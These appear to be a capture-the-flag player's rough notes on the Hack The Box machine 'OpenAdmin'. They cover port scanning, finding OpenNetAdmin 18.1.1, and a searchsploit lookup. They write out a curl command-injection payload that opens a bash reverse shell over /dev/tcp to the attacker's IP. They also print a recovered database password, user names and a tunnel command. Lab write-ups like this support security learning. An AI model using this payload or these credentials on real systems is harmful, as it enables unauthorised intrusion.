## Linux Machine - OpenAdmin
- [+] :  Target IP
      >> 10.10.10.171

### Adventure Mode

## Recon
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

- [+] :  port 80 shows apache default page , lemme add openadmin.htb in dns and try again 
      >> same output .

- [+] :  dirbusting http://openadmin.htb/music/ && http://openadmin.htb/ona/
      >> directory opennetadmin open and running an old version 18.1.1
## foothold

```bash
searchsploit opennetadmin       
OpenNetAdmin 18.1.1 - Command Injection Explo | php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution   | php/webapps/47691.sh
```
./exploit.sh http://10.10.10.171/ona/ [make sure to write the full path otherwise you'll get redirect 301]

 curl --silent -L -d "xajax=window_submit&xajaxr=$(date +%s%3N)&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo%20\"BEGIN\";%2Fbin%2Fbash+-c+%27%2Fbin%2Fbash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.14.4%2F4444+0%3E%261%27;echo%20\"END\"&xajaxargs[]=ping" "http://openadmin.htb/ona/" [exploiting manually for stable revshell ]
 
 - [+] :  writable 
 /opt/ona/bin


db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
        
jimmy
joanna


client http://10.10.14.4:3636 R:52846:127.0.0.1:52846

bloodninjas
##user recon


- [+] :  
      >> 

- [+] :  
      >> 

- [+] :  
      >> 

- [+] :  
      >> 




### Guided Mode

## Tasks 
